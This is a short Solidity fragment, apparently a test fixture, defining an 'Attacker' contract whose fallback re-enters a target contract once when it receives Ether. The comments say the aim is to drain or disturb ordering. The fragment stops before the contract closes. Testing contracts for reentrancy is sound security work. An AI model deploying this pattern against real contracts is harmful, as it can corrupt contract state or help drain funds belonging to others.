// Minimal attacker that on receiving a transfer will reenter c to try to drain or disturb ordering.
contract Attacker {
    address immutable target;
    bool reentered;
    constructor(address _target) payable {
        target = _target;
    }
    // fallback will be called when c.transfer sends Ether to this contract
    fallback() external payable {
        // only reenter once to avoid infinite recursion
        if (!reentered) {
            reentered = true;
            // reenter by calling fallback again with 0 value
            (bool s,) = target.call{value: 0}("");
            // ignore result
            s;
        }
    }
